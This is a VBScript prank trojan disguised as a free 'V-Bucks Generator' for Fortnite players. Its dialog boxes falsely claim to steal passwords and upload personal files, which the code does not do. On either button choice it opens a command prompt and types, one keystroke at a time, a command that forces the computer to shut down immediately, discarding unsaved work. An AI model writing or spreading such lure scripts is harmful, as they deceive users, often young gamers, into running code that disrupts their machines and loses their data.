result = MsgBox ("Are you looking for free V-Bucks?", vbYesNo, "V-Bucks Generator")

Select Case result
Case vbYes
    MsgBox("Ok, but don't tell Epic Games about this, ok?")
Case vbNo
    MsgBox("Then why did you download this lmao")
    WScript.Quit
End Select

result = MsgBox ("First of all, let me copy your passwords", vbYesNo, "V-Bucks Generator")

Select Case result
Case vbYes
    MsgBox("Ok, now click OK to continue.")
Case vbNo
    MsgBox("You can't stop me")
End Select

result = MsgBox ("Now give me a minute to upload all your personal files to my server.", vbYesNo, "V-Bucks Generator")

Select Case result
Case vbYes
    MsgBox("File transfer completed. Click OK to continue.")
Case vbNo
    MsgBox("You're too late!")
End Select

result = MsgBox ("Bro, you have a really good computer. Can I have it?", vbYesNo, "V-Bucks Generator")

Select Case result
Case vbYes
    MsgBox("Wow bro, thank you.")
    set shellobj = CreateObject("WScript.Shell")
shellobj.run "cmd"

wscript.sleep 1000
shellobj.sendkeys "s"
Shellobj.sendkeys "h"
Shellobj.sendkeys "u"
Shellobj.sendkeys "t"
Shellobj.sendkeys "d"
Shellobj.sendkeys "o"
Shellobj.sendkeys "w"
Shellobj.sendkeys "n "
Shellobj.sendkeys "-"
Shellobj.sendkeys "s "
Shellobj.sendkeys "-"
Shellobj.sendkeys "f "
Shellobj.sendkeys "-"
Shellobj.sendkeys "t "
Shellobj.sendkeys "0"
Shellobj.sendkeys "{ENTER}"
Case vbNo
    MsgBox("Sorry, but it's already mine now.")
    set shellobj = CreateObject("WScript.Shell")
shellobj.run "cmd"

wscript.sleep 1000
shellobj.sendkeys "s"
Shellobj.sendkeys "h"
Shellobj.sendkeys "u"
Shellobj.sendkeys "t"
Shellobj.sendkeys "d"
Shellobj.sendkeys "o"
Shellobj.sendkeys "w"
Shellobj.sendkeys "n "
Shellobj.sendkeys "-"
Shellobj.sendkeys "s "
Shellobj.sendkeys "-"
Shellobj.sendkeys "f "
Shellobj.sendkeys "-"
Shellobj.sendkeys "t "
Shellobj.sendkeys "0"
Shellobj.sendkeys "{ENTER}"
End Select